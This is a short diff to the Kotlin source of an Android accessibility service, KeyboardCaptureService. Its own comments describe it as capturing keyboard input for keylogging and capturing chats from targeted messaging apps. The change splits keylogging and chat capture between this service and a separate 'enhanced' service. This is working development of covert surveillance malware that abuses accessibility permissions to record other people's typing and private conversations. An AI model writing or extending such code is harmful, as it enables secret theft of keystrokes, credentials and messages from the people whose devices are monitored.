@@ -61,14 +61,17 @@ class KeyboardCaptureService : AccessibilityService() {
     }
     
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        // Capture ALL keyboard input (not just target apps) for keylogging
+        // Capture keyboard input from non-target apps only
+        // Target apps are handled by EnhancedAccessibilityService with better data (proper chatIdentifier)
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                // Capture keylogs from all apps
-                handleKeylog(event)
+                val packageName = event.packageName?.toString() ?: ""
                 
-                // Also handle chat capture for target apps
-                if (isTargetApp(event.packageName?.toString() ?: "")) {
+                // Skip target apps - EnhancedAccessibilityService handles them
+                if (!isTargetApp(packageName)) {
+                    // Capture keylogs from non-target apps only
+                handleKeylog(event)
+                    // Also handle chat capture for non-target apps
                     handleTextChanged(event)
                 }
             }
